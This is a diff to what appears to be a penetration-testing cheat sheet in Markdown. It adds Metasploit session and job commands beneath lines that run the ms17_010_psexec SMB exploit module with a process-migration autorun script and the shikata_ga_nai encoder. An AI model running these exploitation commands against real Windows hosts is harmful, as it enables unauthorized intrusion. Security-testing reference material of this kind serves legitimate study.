@@ -464,6 +464,9 @@ msf6 exploit(windows/smb/ms17_010_psexec) > set autorunscript migrate -f
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit
 msf6 exploit(windows/smb/ms17_010_psexec) > exploit -e shikata_ga_nai
 msf6 > sessions
+msf6 > sessions -i 1
+msf6 > jobs
+msf6 > jobs kill 1 
 ```
 
 - Local File Inclusion (LFI)
